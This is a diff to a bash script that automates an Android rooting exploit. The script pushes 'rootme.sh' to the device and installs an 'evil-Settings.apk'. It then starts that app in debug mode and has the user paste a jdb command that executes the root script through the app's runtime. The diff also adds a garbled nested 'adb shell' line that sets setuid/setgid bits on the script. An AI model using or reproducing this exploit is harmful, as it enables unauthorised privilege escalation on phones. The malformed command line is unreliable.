@@ -1,4 +1,5 @@
 #!/bin/bash
+
 set -e
 
 function adb_reboot()
@@ -18,16 +19,18 @@ fi
 SDK="$1"
 MAKE=$(which gmake || which make)
 
-export PATH=${SDK}/platform-tools:${SDK}/build-tools/17.0.0:$PATH
+export PATH=${SDK}/platform-tools:${SDK}/build-tools/android-4.4:$PATH
 
 which adb aapt jdb unzip python ${MAKE}
 
 ${MAKE} SDK=${SDK}
 
 # First to get root in ADB shell
-adb push rootme.sh /sdcard/rootme.sh
+adb push rootme.sh /data/local/tmp/rootme.sh
+adb shell "adb shell "chmod 06744 /data/local/tmp/rootme.sh"" 
 adb install evil-Settings.apk
 adb shell am start -D -a android.intent.action.MAIN -n a.b.c.d/android.app.Activity
+sleep 1
 adb forward tcp:8600 jdwp:$(adb jdwp)
 
 cat << EOF
@@ -40,7 +43,7 @@ When you see the debugger prompt (>), paste the following command:
 
 then tap the screen in your device and go back to this terminal. You should see the "Breakpoint hit" message, and then a different prompt (<1> main[1]). Then paste the following command:
 
-	print java.lang.Runtime.getRuntime().exec("/system/bin/sh /sdcard/rootme.sh")
+	print java.lang.Runtime.getRuntime().exec("/system/bin/sh /data/local/tmp/rootme.sh")
 
 wait a few seconds until you see the command output, and the "<1> main[1]" prompt is displayed back at you. Then type:
 
